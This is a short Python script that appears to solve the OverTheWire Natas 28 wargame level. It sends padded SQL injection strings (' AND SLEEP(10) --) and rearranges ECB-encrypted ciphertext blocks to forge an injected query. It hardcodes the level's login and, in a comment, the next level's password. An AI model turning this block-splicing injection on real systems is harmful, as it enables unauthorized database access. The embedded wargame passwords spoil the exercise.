from bs4 import BeautifulSoup
import requests
import urllib.parse
import base64
import concurrent.futures


def make(url, auth, my_params):
    res = requests.get(url=url,auth=lvl_pass, params=my_params)
    return res

def writeResponse(response, enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(BeautifulSoup(response.text, 'html.parser').prettify())

def decipher(encStr):
    return urllib.parse.unquote(encStr)

def recipher(decStr):
    return urllib.parse.quote(decStr)


def urlQuery(url, auth, my_params):
    return decipher(make(url,auth,my_params).url[60:])

def numToCode(x):
    return [x,urlQuery(url, lvl_pass, {'query':'         ' + "' AND SLEEP(10) -- " + ' '*x})]

lvl_name = 'natas28'
lvl_pass = requests.auth.HTTPBasicAuth(f'{lvl_name}','skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4')
url = f'http://{lvl_name}.natas.labs.overthewire.org'
NUM_CODES=20
BLOCK_SIZE=16
def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=NUM_CODES) as executor:
        codes = [x for x in executor.map(numToCode, list(range(NUM_CODES+1)))]

    for x in codes:
        space_x = x[1][:12] + ' ' + ' '.join([x[1][i:i+(BLOCK_SIZE)] for i in range(12, len(x[1]), BLOCK_SIZE)])
        print(f'{x[0]:2}  -->    {len(x[1]):5}: {space_x}')

def solve(newstr):
    x = urlQuery(url, lvl_pass, {'query': (' ' * 9) + newstr})
    code = [x[1][:12]] + [x[i:i+(BLOCK_SIZE)] for i in range(12, len(x), BLOCK_SIZE)]
    print(' '.join(code))
    code.pop(2)
    print(' '.join(code))
    print(recipher(''.join(code)))
    
    #PW= pc0w0Vo0KpTHcEsgMhXu2EwUzyYemPno
